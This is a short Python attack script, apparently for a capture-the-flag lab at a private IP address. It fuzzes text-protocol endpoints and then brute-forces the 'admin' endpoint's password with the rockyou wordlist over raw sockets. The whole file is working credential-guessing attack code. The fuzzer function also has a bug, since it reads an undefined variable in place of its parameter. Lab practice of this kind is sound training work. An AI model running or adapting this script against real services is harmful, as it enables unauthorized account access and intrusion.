
# networking
import socket

# params
host = "10.10.95.109"
port = 8000

password_file = "../../wordlists/rockyou.txt"

def fuzz_endpoints(fuzzer_file):
	try:
		# open the file, but only read it with 'r'
		with open(wordlist_file, 'r') as file:
			# loop through each line
			for line in file:
				# clean up the new lines and spaces at end of line to prevent problems
				test_endpoint = line.strip()

				# start connection
				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as data_stream:
					# connect to host
					data_stream.connect((host, port))

					# send the attempted endpoint but also encode it as a byte is required
					# we also add a \n on the end to allow for a newline to then send the next endpoint attempt
					data_stream.sendall(test_endpoint.encode() + b'\n')

					# and then recieve the response
					response = data_stream.recv(1024).decode().strip()

					if response != "" and "is not defined" not in response and "leading zeros" not in response:
						print("[!] Possible endpoint: " + test_endpoint + " Server response: " + response)
						

	except Exception as e:
		print(e)

def attack_password(password_file):
	try:
		with open(password_file, 'r') as file:
			for line in file:

				endpoint = "admin"
				password_attempt = line.strip();

				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as data_stream:
					data_stream.connect((host, port))

					data_stream.sendall(endpoint.encode() + b'\n')

					# and then recieve the response
					response = data_stream.recv(1024).decode().strip()

					if response == "Password:":
						data_stream.sendall(password_attempt.encode() + b'\n')

						response = data_stream.recv(1024).decode().strip()

						if response != "Password:":
							print("[+] Successful attack! Password used: " + password_attempt + " | Server response: " + response)
							exit()
					else:
						print("[!] " + response)
	except Exception as e:
		print(e)


attack_password(password_file)



